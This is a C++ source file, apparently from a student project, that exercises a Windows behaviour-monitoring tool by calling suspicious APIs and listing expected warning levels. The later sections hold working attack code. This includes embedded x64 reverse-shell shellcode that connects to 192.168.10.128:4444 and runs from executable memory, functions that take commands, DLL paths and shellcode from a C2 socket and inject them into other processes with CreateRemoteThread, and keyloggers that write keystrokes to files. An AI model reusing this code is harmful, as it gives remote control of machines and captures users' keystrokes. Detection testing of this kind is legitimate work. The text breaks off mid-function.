		int result = connect(sock, (sockaddr*)&targetAddr, sizeof(targetAddr));
		if (result == SOCKET_ERROR) {
			std::cout << "  [FAILED] Connection refused or timed out (expected if Kali not listening)\n";
		}
		else {
			std::cout << "  [SUCCESS] Connection established to Kali\n";
			std::this_thread::sleep_for(std::chrono::seconds(10)); // 保持连接一会儿
			closesocket(sock);  // 关闭连接
		}

		std::cout << "----------------------------------------\n";

		// 防止触发频率过快
		std::this_thread::sleep_for(std::chrono::milliseconds(200));
	}

	WSACleanup();
}

void TestMaliciousWSAConnects()
{
	// 初始化Winsock
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		std::cerr << "WSAStartup failed: " << WSAGetLastError() << "\n";
		return;
	}

	// Kali服务器地址和端口
	const char* kaliIP = "192.168.10.128";
	const int kaliPort = 5555;

	std::cout << "Testing WSAConnect to Kali " << kaliIP << ":" << kaliPort << "\n";

	// 创建TCP套接字
	SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == INVALID_SOCKET) {
		std::cerr << "Socket creation failed: " << WSAGetLastError() << "\n";
		WSACleanup();
		return;
	}

	// 设置目标地址
	sockaddr_in targetAddr;
	targetAddr.sin_family = AF_INET;
	targetAddr.sin_port = htons(kaliPort);
	inet_pton(AF_INET, kaliIP, &targetAddr.sin_addr);

	// 调用WSAConnect连接
	int result = WSAConnect(sock, (sockaddr*)&targetAddr, sizeof(targetAddr), nullptr, nullptr, nullptr, nullptr);

	if (result == SOCKET_ERROR) {
		DWORD err = WSAGetLastError();
		std::cout << "[WSAConnect] Connection attempt failed: " << err << "\n";
	}
	else {
		std::cout << "[WSAConnect] Connection established successfully.\n";
		// 这里你可以发送数据，或者执行后续操作
	}

	closesocket(sock);
	WSACleanup();
}

// 生成随机域名
std::string GenerateRandomDomain(int length) {
	std::string domain;
	domain.reserve(length);

	std::random_device rd;
	std::mt19937 gen(rd());
	std::uniform_int_distribution<> dis('a', 'z');

	for (int i = 0; i < length; ++i) {
		domain.push_back(static_cast<char>(dis(gen)));

		// 随机添加点分隔符
		if (i > 0 && i < length - 1 && (i % 8 == 0)) {
			domain.push_back('.');
		}
	}

	return domain;
}

// 恶意 DNS 查询测试函数
void TestMaliciousGetAddrInfo()
{
	// 初始化Winsock
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		std::cerr << "WSAStartup failed: " << WSAGetLastError() << "\n";
		return;
	}

	// 测试用例设计
	struct TestCase {
		std::string nodeName;
		std::string serviceName;
		std::string description;
		int expectedWarningLevel;
	};

	std::vector<TestCase> testCases = {
		// 1. 敏感关键字检测 (vpn)
		{"secure-vpn-server.com", "443", "VPN service (vpn keyword)", 2},

		// 2. 敏感关键字检测 (proxy)
		{"proxy.example.org", "8080", "Proxy service (proxy keyword)", 2},

		// 3. 敏感关键字检测 (tor)
		{"tor-relay.net", "9001", "TOR relay (tor keyword)", 2},

		// 4. 可疑端口检测 (6666)
		{"example.com", "6666", "Suspicious port 6666", 2},

		// 5. 可疑端口检测 (31337)
		{"test.org", "31337", "Suspicious port 31337 (elite port)", 2},

		// 6. 长域名检测 (DNS隧道)
		{GenerateRandomDomain(128), "53", "Long domain name (possible DNS tunneling)", 1},

		// 7. 超长域名检测
		{GenerateRandomDomain(256), "80", "Very long domain name (high risk tunneling)", 1},

		// 8. 组合测试 (敏感关键字 + 可疑端口)
		{"anonymous-proxy.io", "31337", "Proxy service with elite port", 2},

		// 9. 组合测试 (长域名 + 敏感关键字)
		{"secure-" + GenerateRandomDomain(100) + "-vpn.com", "443", "Long domain with VPN keyword", 2},

		// 10. 正常查询 (HTTP)
		{"www.example.com", "80", "Normal HTTP service", 0},

		// 11. 正常查询 (HTTPS)
		{"google.com", "443", "Normal HTTPS service", 0},

		// 12. 正常查询 (DNS)
		{"dns-server.local", "53", "Normal DNS service", 0},

		// 13. 本地服务查询
		{"localhost", "8080", "Localhost service", 0},

		// 14. 服务名查询 (非端口号)
		{"smtp.example.com", "smtp", "Service name instead of port number", 0}
	};

	for (const auto& test : testCases) {
		std::cout << "Testing: " << test.description << "\n";
		std::cout << "  Node: " << test.nodeName << "\n";
		std::cout << "  Service: " << test.serviceName << "\n";

		ADDRINFOA hints;
		PADDRINFOA result = nullptr;

		ZeroMemory(&hints, sizeof(hints));
		hints.ai_family = AF_UNSPEC;
		hints.ai_socktype = SOCK_STREAM;
		hints.ai_protocol = IPPROTO_TCP;

		// 执行 DNS 查询
		int status = getaddrinfo(
			test.nodeName.c_str(),
			test.serviceName.c_str(),
			&hints,
			&result
		);

		if (status != 0) {
			std::cerr << "  [ERROR] getaddrinfo failed: " << gai_strerror(status) << "\n";
		}
		else {
			std::cout << "  [SUCCESS] DNS query completed\n";

			// 打印解析结果
			for (PADDRINFOA ptr = result; ptr != nullptr; ptr = ptr->ai_next) {
				char ipstr[INET6_ADDRSTRLEN];
				DWORD ipstrlen = sizeof(ipstr);

				if (ptr->ai_family == AF_INET) {
					sockaddr_in* ipv4 = (sockaddr_in*)ptr->ai_addr;
					inet_ntop(AF_INET, &(ipv4->sin_addr), ipstr, ipstrlen);
					std::cout << "    IPv4: " << ipstr << "\n";
				}
				else if (ptr->ai_family == AF_INET6) {
					sockaddr_in6* ipv6 = (sockaddr_in6*)ptr->ai_addr;
					inet_ntop(AF_INET6, &(ipv6->sin6_addr), ipstr, ipstrlen);
					std::cout << "    IPv6: " << ipstr << "\n";
				}
			}

			// 释放结果
			freeaddrinfo(result);
		}

		std::cout << "  Expected warning level: " << test.expectedWarningLevel << "\n";
		std::cout << "----------------------------------------\n";

		// 添加延迟避免过快触发
		std::this_thread::sleep_for(std::chrono::milliseconds(100));
	}

	// 清理
	WSACleanup();
}

// 恶意 Socket 创建测试函数
void TestMaliciousSocketCreation()
{
	// 初始化Winsock
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		std::cerr << "WSAStartup failed: " << WSAGetLastError() << "\n";
		return;
	}

	// 测试用例设计
	struct TestCase {
		int af;
		int type;
		int protocol;
		std::string description;
		int expectedWarningLevel;
	};

	std::vector<TestCase> testCases = {
		// 1. 正常TCP套接字 (IPv4)
		{AF_INET, SOCK_STREAM, IPPROTO_TCP, "Normal TCP socket (IPv4)", 0},

		// 2. 正常UDP套接字 (IPv4)
		{AF_INET, SOCK_DGRAM, IPPROTO_UDP, "Normal UDP socket (IPv4)", 0},

		// 3. 正常TCP套接字 (IPv6)
		{AF_INET6, SOCK_STREAM, IPPROTO_TCP, "Normal TCP socket (IPv6)", 0},

		// 4. 正常UDP套接字 (IPv6)
		{AF_INET6, SOCK_DGRAM, IPPROTO_UDP, "Normal UDP socket (IPv6)", 0},

		// 5. RAW套接字 (ICMP)
		{AF_INET, SOCK_RAW, IPPROTO_ICMP, "RAW socket (ICMP)", 2},

		// 6. RAW套接字 (自定义协议)
		{AF_INET, SOCK_RAW, 255, "RAW socket (custom protocol)", 2},

		// 7. RAW套接字 (IPv6)
		{AF_INET6, SOCK_RAW, IPPROTO_ICMPV6, "RAW socket (IPv6 ICMPv6)", 2},

		// 8. 未知地址族
		{999, SOCK_STREAM, IPPROTO_TCP, "Unknown address family", 0},

		// 9. 未知套接字类型
		{AF_INET, 999, IPPROTO_TCP, "Unknown socket type", 0},

		// 10. 未知协议
		{AF_INET, SOCK_STREAM, 999, "Unknown protocol", 0},

		// 11. 原始TCP套接字（可能用于端口扫描）
		{AF_INET, SOCK_RAW, IPPROTO_TCP, "RAW socket (TCP)", 2},

		// 12. 原始UDP套接字（可能用于网络扫描）
		{AF_INET, SOCK_RAW, IPPROTO_UDP, "RAW socket (UDP)", 2},

		// 13. 原始IPv6 TCP套接字
		{AF_INET6, SOCK_RAW, IPPROTO_TCP, "RAW socket (IPv6 TCP)", 2},

		// 14. 原始IPv6 UDP套接字
		{AF_INET6, SOCK_RAW, IPPROTO_UDP, "RAW socket (IPv6 UDP)", 2}
	};

	for (const auto& test : testCases) {
		std::cout << "Testing: " << test.description << "\n";
		std::cout << "  AF: " << test.af << ", Type: " << test.type << ", Protocol: " << test.protocol << "\n";

		// 创建套接字
		SOCKET sock = socket(test.af, test.type, test.protocol);

		if (sock == INVALID_SOCKET) {
			DWORD err = WSAGetLastError();
			std::cerr << "  [ERROR] Socket creation failed: " << err << "\n";

			// 原始套接字通常需要管理员权限
			if (test.type == SOCK_RAW && err == WSAEACCES) {
				std::cout << "  [NOTE] RAW socket requires administrator privileges\n";
			}
		}
		else {
			std::cout << "  [SUCCESS] Socket created successfully\n";

			// 获取套接字信息
			int sock_type;
			int optlen = sizeof(sock_type);
			getsockopt(sock, SOL_SOCKET, SO_TYPE, (char*)&sock_type, &optlen);

			int sock_protocol;
			optlen = sizeof(sock_protocol);
			getsockopt(sock, SOL_SOCKET, SO_PROTOCOL_INFO, (char*)&sock_protocol, &optlen);

			std::cout << "  Actual socket type: " << sock_type << ", protocol: " << sock_protocol << "\n";

			// 关闭套接字
			closesocket(sock);
		}

		std::cout << "  Expected warning level: " << test.expectedWarningLevel << "\n";
		std::cout << "----------------------------------------\n";

		// 添加延迟避免过快触发
		std::this_thread::sleep_for(std::chrono::milliseconds(100));
	}

	// 清理
	WSACleanup();
}

// 恶意 Socket 关闭测试函数
void TestMaliciousSocketClose()
{
	// 初始化Winsock
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		std::cerr << "WSAStartup failed: " << WSAGetLastError() << "\n";
		return;
	}

	// 测试用例设计
	struct TestCase {
		SOCKET socket;
		std::string description;
		int expectedWarningLevel;
	};

	// 创建一些测试套接字
	SOCKET validSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	SOCKET anotherValidSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

	// 准备测试用例
	std::vector<TestCase> testCases = {
		// 1. 正常关闭有效套接字
		{validSocket, "Close valid TCP socket", 0},

		// 2. 关闭无效套接字 (INVALID_SOCKET)
		{INVALID_SOCKET, "Close INVALID_SOCKET", 0},

		// 3. 关闭NULL套接字 (0)
		{0, "Close NULL socket (0)", 2},

		// 4. 关闭随机值套接字
		{(SOCKET)0xDEADBEEF, "Close random socket handle", 0},

		// 5. 重复关闭同一个套接字 (第一次)
		{anotherValidSocket, "Close valid UDP socket (first time)", 0},

		// 6. 重复关闭同一个套接字 (第二次)
		{anotherValidSocket, "Close same UDP socket again", 1},

		// 7. 快速连续关闭多个套接字
		{socket(AF_INET, SOCK_STREAM, IPPROTO_TCP), "Close socket 1 of 5", 0},
		{socket(AF_INET, SOCK_STREAM, IPPROTO_TCP), "Close socket 2 of 5", 0},
		{socket(AF_INET, SOCK_STREAM, IPPROTO_TCP), "Close socket 3 of 5", 0},
		{socket(AF_INET, SOCK_STREAM, IPPROTO_TCP), "Close socket 4 of 5", 0},
		{socket(AF_INET, SOCK_STREAM, IPPROTO_TCP), "Close socket 5 of 5", 1}
	};

	for (auto& test : testCases) {
		std::cout << "Testing: " << test.description << "\n";
		std::cout << "  Socket: " << test.socket << "\n";

		// 执行关闭操作
		int result = closesocket(test.socket);

		if (result == SOCKET_ERROR) {
			DWORD err = WSAGetLastError();
			std::cerr << "  [ERROR] closesocket failed: " << err << "\n";
		}
		else {
			std::cout << "  [SUCCESS] Socket closed\n";
		}

		std::cout << "  Expected warning level: " << test.expectedWarningLevel << "\n";
		std::cout << "----------------------------------------\n";

		// 对于快速连续关闭测试，添加延迟避免一次性关闭
		if (test.description.find("socket 1 of 5") != std::string::npos) {
			std::this_thread::sleep_for(std::chrono::milliseconds(10));
		}
	}

	// 清理
	WSACleanup();
}

/*--------------------------------------------------------------------------------------------------------------
-------------------------------------------------沈丽彤---------------------------------------------------------
----------------------------------------------------------------------------------------------------------------*/


void CREATEPROCESSW() {
	// 网络通信部分
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);

	SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	sockaddr_in servAddr;
	memset(&servAddr, 0, sizeof(servAddr));
	servAddr.sin_family = AF_INET;
	servAddr.sin_addr.s_addr = inet_addr("192.168.10.128"); // 恶意C2服务器
	servAddr.sin_port = htons(4444);

	connect(sock, (SOCKADDR*)&servAddr, sizeof(servAddr));

	// 接收远程指令
	char cmd[256];
	recv(sock, cmd, sizeof(cmd), 0);

	// 执行恶意进程创建（会触发检测）
	if (strstr(cmd, "launch")) {
		STARTUPINFOA si = { sizeof(si) };
		PROCESS_INFORMATION pi = { 0 };
		char cmdLine[] = "cmd.exe /c dir";
		// 2. 正确调用CreateProcessA
		BOOL bSuccess = CreateProcessA(
			NULL,                    // 应用程序名(可空)
			cmdLine,     // 命令行(必须可写)
			NULL,                    // 进程安全属性
			NULL,                    // 线程安全属性
			FALSE,                   // 不继承句柄
			CREATE_NO_WINDOW,        // 创建标志
			NULL,                    // 环境变量(继承)
			NULL,                    // 当前目录(继承)
			&si,                     // 启动信息
			&pi                      // 进程信息
		);
		if (!bSuccess) {
			DWORD dwError = GetLastError();
			printf("CreateProcess failed (%d)\n", dwError);
		}
		else {
			CloseHandle(pi.hProcess);
			CloseHandle(pi.hThread);
		}
	}

	closesocket(sock);
	WSACleanup();
}


void CREATETHREAD() {

	// 初始化Winsock
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);

	// 创建Socket
	SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	// 设置目标IP和端口
	sockaddr_in targetAddr;
	memset(&targetAddr, 0, sizeof(targetAddr));
	targetAddr.sin_family = AF_INET;
	targetAddr.sin_addr.s_addr = inet_addr("192.168.10.128");
	targetAddr.sin_port = htons(4444);

	// 发起连接（反向连接）
	if (connect(sock, (SOCKADDR*)&targetAddr, sizeof(targetAddr)) == SOCKET_ERROR) {
		printf("连接失败\n");
		closesocket(sock);
		WSACleanup();
		return;
	}
	printf("连接成功！\n");

	unsigned char shellcode[] = {
			0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50,
			0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52,
			0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a,
			0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41,
			0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52,
			0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
			0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40,
			0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48,
			0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
			0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1,
			0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c,
			0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01,
			0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a,
			0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b,
			0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x49, 0xbe, 0x77, 0x73, 0x32, 0x5f, 0x33,
			0x32, 0x00, 0x00, 0x41, 0x56, 0x49, 0x89, 0xe6, 0x48, 0x81, 0xec, 0xa0, 0x01, 0x00,
			0x00, 0x49, 0x89, 0xe5, 0x49, 0xbc, 0x02, 0x00, 0x11, 0x5c, 0xc0, 0xa8, 0x0a, 0x80,
			0x41, 0x54, 0x49, 0x89, 0xe4, 0x4c, 0x89, 0xf1, 0x41, 0xba, 0x4c, 0x77, 0x26, 0x07,
			0xff, 0xd5, 0x4c, 0x89, 0xea, 0x68, 0x01, 0x01, 0x00, 0x00, 0x59, 0x41, 0xba, 0x29,
			0x80, 0x6b, 0x00, 0xff, 0xd5, 0x50, 0x50, 0x4d, 0x31, 0xc9, 0x4d, 0x31, 0xc0, 0x48,
			0xff, 0xc0, 0x48, 0x89, 0xc2, 0x48, 0xff, 0xc0, 0x48, 0x89, 0xc1, 0x41, 0xba, 0xea,
			0x0f, 0xdf, 0xe0, 0xff, 0xd5, 0x48, 0x89, 0xc7, 0x6a, 0x10, 0x41, 0x58, 0x4c, 0x89,
			0xe2, 0x48, 0x89, 0xf9, 0x41, 0xba, 0x99, 0xa5, 0x74, 0x61, 0xff, 0xd5, 0x48, 0x81,
			0xc4, 0x40, 0x02, 0x00, 0x00, 0x49, 0xb8, 0x63, 0x6d, 0x64, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x41, 0x50, 0x41, 0x50, 0x48, 0x89, 0xe2, 0x57, 0x57, 0x57, 0x4d, 0x31, 0xc0,
			0x6a, 0x0d, 0x59, 0x41, 0x50, 0xe2, 0xfc, 0x66, 0xc7, 0x44, 0x24, 0x54, 0x01, 0x01,
			0x48, 0x8d, 0x44, 0x24, 0x18, 0xc6, 0x00, 0x68, 0x48, 0x89, 0xe6, 0x56, 0x50, 0x41,
			0x50, 0x41, 0x50, 0x41, 0x50, 0x49, 0xff, 0xc0, 0x41, 0x50, 0x49, 0xff, 0xc8, 0x4d,
			0x89, 0xc1, 0x4c, 0x89, 0xc1, 0x41, 0xba, 0x79, 0xcc, 0x3f, 0x86, 0xff, 0xd5, 0x48,
			0x31, 0xd2, 0x48, 0xff, 0xca, 0x8b, 0x0e, 0x41, 0xba, 0x08, 0x87, 0x1d, 0x60, 0xff,
			0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 0xd5,
			0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,
			0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5
	};

	LPVOID execMem = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(execMem, shellcode, sizeof(shellcode));

	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)execMem, NULL, 0, NULL);
	if (hThread) {
		WaitForSingleObject(hThread, INFINITE);
		CloseHandle(hThread);
	}
	VirtualFree(execMem, 0, MEM_RELEASE);

	closesocket(sock);
	WSACleanup();
}
void EXITTHREAD() {
	// 初始化Winsock
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);

	// 创建Socket
	SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	// 设置目标IP和端口（攻击者监听）
	sockaddr_in targetAddr;
	memset(&targetAddr, 0, sizeof(targetAddr));
	targetAddr.sin_family = AF_INET;
	targetAddr.sin_addr.s_addr = inet_addr("192.168.10.128"); // Kali IP
	targetAddr.sin_port = htons(4444);

	// 反向连接
	if (connect(sock, (SOCKADDR*)&targetAddr, sizeof(targetAddr)) == SOCKET_ERROR) {
		printf("连接失败！\n");
		closesocket(sock);
		WSACleanup();
		return;
	}
	printf("连接成功，等待接收 exitCode...\n");

	// 接收攻击者指定的线程退出码
	DWORD exitCode = 0;
	int len = recv(sock, (char*)&exitCode, sizeof(exitCode), 0);
	printf("接收到 exitCode: 0x%08X\n", exitCode);

	if (len == sizeof(exitCode) && exitCode != 0) {
		// 模拟异常退出线程（会被监控记录）
		ExitThread(exitCode);
	}

	// 清理资源
	closesocket(sock);
	WSACleanup();
}
void LOADLIBRARYEXA() {
	// 初始化Winsock（保持图片完全相同的风格）
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);

	// 创建C2通信套接字（修改为攻击者IP）
	SOCKET c2Sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	sockaddr_in c2Addr;
	memset(&c2Addr, 0, sizeof(c2Addr));
	c2Addr.sin_family = AF_INET;
	c2Addr.sin_addr.s_addr = inet_addr("192.168.10.128"); // C2服务器IP
	c2Addr.sin_port = htons(4444);
	connect(c2Sock, (SOCKADDR*)&c2Addr, sizeof(c2Addr));

	// 从C2接收恶意DLL路径（会触发LOADLIBRARY检测）
	char dllPath[MAX_PATH];
	recv(c2Sock, dllPath, MAX_PATH, 0);

	// 触发监控的恶意DLL加载行为
	HMODULE hMalDll = LoadLibraryExA(
		dllPath,          // 如："C:\\Temp\\inject.dll"
		NULL,
		LOAD_WITH_ALTERED_SEARCH_PATH
	);

	if (hMalDll) {
		// 获取并执行恶意导出函数
		FARPROC pMalFunc = GetProcAddress(hMalDll, "Start");
		if (pMalFunc) {
			((void(*)())pMalFunc)();
		}
		FreeLibrary(hMalDll);
	}

	// 清理资源（完全保持图片风格）
	closesocket(c2Sock);
	WSACleanup();
}
void GETPROCADDRESS() {
	// 初始化Winsock
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	// 创建C2通信套接字（修改为攻击者IP）
	SOCKET c2Sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	sockaddr_in c2Addr;
	memset(&c2Addr, 0, sizeof(c2Addr));
	c2Addr.sin_family = AF_INET;
	c2Addr.sin_addr.s_addr = inet_addr("192.168.10.128"); // C2服务器IP
	c2Addr.sin_port = htons(4444);
	connect(c2Sock, (SOCKADDR*)&c2Addr, sizeof(c2Addr));
	// 从C2接收要解析的API名称（会触发GETPROCADDRESS检测）
	char apiName[64];
	recv(c2Sock, apiName, sizeof(apiName), 0);
	// 触发监控的恶意API解析行为
	HMODULE hModule = GetModuleHandleA("kernel32.dll");
	FARPROC pFunc = GetProcAddress(hModule, apiName); // 如："CreateRemoteThread"
	if (pFunc) {
		// 执行危险API：线程注入
		if (strcmp(apiName, "CreateRemoteThread") == 0) {
			HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 1234);

			// 正确定义函数指针类型
			typedef HANDLE(WINAPI* fnCreateRemoteThread)(
				HANDLE,
				LPSECURITY_ATTRIBUTES,
				SIZE_T,
				LPTHREAD_START_ROUTINE,
				LPVOID,
				DWORD,
				LPDWORD
				);

			// 类型转换后调用
			((fnCreateRemoteThread)pFunc)(
				hProcess,
				NULL,
				0,
				NULL,
				NULL,
				0,
				NULL
				);

			CloseHandle(hProcess);
		}
	}
}

void VIRTUALALLOCEX() {



}

void WRITEPROCESSMEMORY() {
	// 1. 正确初始化Winsock
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		return;
	}

	// 创建C2通信套接字（修改为攻击者IP）
	SOCKET c2Sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	sockaddr_in c2Addr;
	memset(&c2Addr, 0, sizeof(c2Addr));
	c2Addr.sin_family = AF_INET;
	c2Addr.sin_addr.s_addr = inet_addr("192.168.10.128"); // C2服务器IP
	c2Addr.sin_port = htons(4444);
	connect(c2Sock, (SOCKADDR*)&c2Addr, sizeof(c2Addr));

	// 从C2接收目标PID和写入数据
	struct {
		DWORD pid;
		char data[256];
	} payload;

	recv(c2Sock, (char*)&payload, sizeof(payload), 0);

	// 触发监控的跨进程内存写入（会触发WRITEPROCESSMEMORY检测）
	HANDLE hTarget = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, payload.pid);
	if (hTarget) {
		// 在目标进程写入数据
		SIZE_T bytesWritten;
		WriteProcessMemory(
			hTarget,                     // 非当前进程句柄
			(LPVOID)0x00400000,          // 目标地址（示例）
			payload.data,                // 写入数据
			strlen(payload.data) + 1,    // 数据长度
			&bytesWritten                // 返回写入字节数
		);
		CloseHandle(hTarget);
	}

	// 清理资源（完全保持图片风格）
	closesocket(c2Sock);
	WSACleanup();
}
void CREATEREMOTETHREAD() {
	// 初始化Winsock
	WSADATA wsaData; WSAStartup(MAKEWORD(2, 2), &wsaData);

	// 创建C2通信套接字
	SOCKET c2Sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	sockaddr_in c2Addr; memset(&c2Addr, 0, sizeof(c2Addr));
	c2Addr.sin_family = AF_INET;
	c2Addr.sin_addr.s_addr = inet_addr("192.168.10.128"); // C2服务器IP
	c2Addr.sin_port = htons(4444);
	connect(c2Sock, (SOCKADDR*)&c2Addr, sizeof(SOCKADDR));
	Sleep(500); // 保持图片中的延迟

	// 从C2接收目标PID和shellcode
	struct {
		DWORD pid;
		BYTE shellcode[256];
	} payload;
	recv(c2Sock, (char*)&payload, sizeof(payload), NULL);

	// 触发CREATEREMOTETHREAD检测（关键恶意行为）
	HANDLE hTarget = OpenProcess(PROCESS_ALL_ACCESS, FALSE, payload.pid);
	if (hTarget != NULL) {
		LPVOID pRemoteMem = VirtualAllocEx(hTarget, NULL, sizeof(payload.shellcode),
			MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (pRemoteMem) {
			WriteProcessMemory(hTarget, pRemoteMem, payload.shellcode,
				sizeof(payload.shellcode), NULL);

			// 触发监控的核心调用
			CreateRemoteThread(hTarget, NULL, 0,
				(LPTHREAD_START_ROUTINE)pRemoteMem,
				NULL, 0, NULL);
		}
		CloseHandle(hTarget);
	}

	// 清理资源
	closesocket(c2Sock); WSACleanup();
}




/*--------------------------------------------------------------------------------------------------------------
-------------------------------------------------姚文达---------------------------------------------------------
----------------------------------------------------------------------------------------------------------------*/
void dangerousKeyLogging() {
	// 创建一个文件来记录按键
	FILE* logFile;
	fopen_s(&logFile, "keylog.txt", "a+");

	if (logFile) {
		// 循环检测常用键位
		for (int key = 0x8; key <= 0xFF; key++) {
			// 检测按键状态
			SHORT keyState = GetAsyncKeyState(key);

			// 如果按键被按下 (最高位为1)
			if (keyState & 0x8000) {//0x8000在二进制中是1000 0000 0000 0000，如果keyState最高位是1，则与结果不会是0
				// 记录特殊键位
				if (key == VK_RETURN)//回车键
					fprintf(logFile, "[ENTER]\n");
				else if (key == VK_BACK)//退格
					fprintf(logFile, "[BACKSPACE]");
				else if (key == VK_SPACE)//空格
					fprintf(logFile, " ");
				else if (key >= 0x41 && key <= 0x5A) // A-Z
					fprintf(logFile, "%c", key);
			}
		}
		fclose(logFile);
	}
}

// 模拟危险操作：疯狂调用 GetKeyState 记录按键状态
void suspiciousKeyStateLogging() {
	FILE* logFile;
	fopen_s(&logFile, "keystate_log.txt", "a+");

	if (logFile) {
		for (int key = 0x8; key <= 0x90; key++) {
			SHORT state = GetKeyState(key);
			if (state & 0x8000) {  // 检查是否被按下
				if (key == VK_RETURN)
					fprintf(logFile, "[ENTER]\n");
				else if (key == VK_BACK)
					fprintf(logFile, "[BACKSPACE]");
				else if (key == VK_SPACE)
					fprintf(logFile, " ");
				else if (key >= 0x41 && key <= 0x5A)
					fprintf(logFile, "%c", key);
			}
		}
		fclose(logFile);
	}
}

// 注册多个热键用于测试 hook 检测
void simulateHotkeyRegistration() {
	// 常用快捷键组合

	RegisterHotKey(NULL, 1, MOD_CONTROL, 'C');                  // Ctrl+C
	Sleep(1000);//注册热键太快的话，往共享内存中写可能会覆盖，主程序可能来不及去共享内存读，导致只有最后注册的热键信息能被读到
	RegisterHotKey(NULL, 2, MOD_WIN, 'R');                      // Win+R
	Sleep(1000);
	RegisterHotKey(NULL, 3, MOD_ALT | MOD_CONTROL, VK_DELETE);  // Ctrl+Alt+Del（敏感）
	Sleep(1000);
	RegisterHotKey(NULL, 4, MOD_ALT, VK_F4);                    // Alt+F4
	Sleep(1000);

	//当用户按下热键组合，系统会向注册它的应用程序发送一个WM_HOTKEY消息

	// 消息循环保持进程
	//MSG msg = { 0 };
	//while (GetMessage(&msg, NULL, 0, 0)) {
	//	if (msg.message == WM_HOTKEY) {
	//		std::cout << "触发了热键：" << msg.wParam << std::endl;
	//	}
	//}
}

// 钩子句柄（全局）
HHOOK g_hHook = NULL;

// 钩子回调函数示例 (WH_CBT)
LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HCBT_CREATEWND) {
		printf("[HookProc] 检测到窗口创建 HWND=%p\n", (HWND)wParam);
	}
	return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}

void installSetWindowsHookExATest() {
	// 安装线程钩子（当前线程）
	g_hHook = SetWindowsHookExA(WH_CBT, HookProc, GetModuleHandle(NULL), GetCurrentThreadId());

	if (g_hHook == NULL) {
		printf("安装钩子失败，错误码: %lu\n", GetLastError());
	}
	else {
		printf("成功安装 WH_CBT 钩子！\n");
		printf("钩子将在当前线程消息循环中生效，按回车退出钩子并返回菜单。\n");

		// 进入消息循环，让钩子生效
		MSG msg;
		while (GetMessage(&msg, NULL, 0, 0)) {
			TranslateMessage(&msg);
			DispatchMessage(&msg);

			// 用户按回车退出循环
